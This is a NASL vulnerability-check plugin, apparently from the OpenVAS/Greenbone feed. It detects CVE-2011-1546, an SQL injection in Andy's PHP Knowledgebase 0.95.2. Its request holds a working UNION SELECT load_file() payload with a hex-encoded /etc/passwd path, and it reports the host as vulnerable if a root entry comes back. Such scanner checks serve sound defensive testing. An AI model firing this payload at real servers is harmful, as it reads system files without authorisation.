CPE = "cpe:/a:aphpkb:aphpkb";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103135" );
	script_version( "2020-10-20T15:03:35+0000" );
	script_tag( name: "last_modification", value: "2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)" );
	script_tag( name: "creation_date", value: "2011-03-31 17:03:50 +0200 (Thu, 31 Mar 2011)" );
	script_bugtraq_id( 47097 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2011-1546" );
	script_name( "Andy's PHP Knowledgebase 's' Parameter SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "secpod_aphpkb_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "aphpkb/installed" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/47097" );
	script_tag( name: "solution", value: "Updates are available. Please contact the vendor for more information." );
	script_tag( name: "summary", value: "Andy's PHP Knowledgebase is prone to an SQL-injection vulnerability
  because it fails to sufficiently sanitize user-supplied data before using it in an SQL query." );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "Andy's PHP Knowledgebase 0.95.2 is vulnerable. Other versions may also
  be affected." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = NASLString( dir, "/a_viewusers.php?s=1+UNION+SELECT+load_file(0x2f6574632f706173737764),null,null,null,null,null,null+limit+0" );
if(http_vuln_check( port: port, url: url, pattern: "root:.*:0:[01]:" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

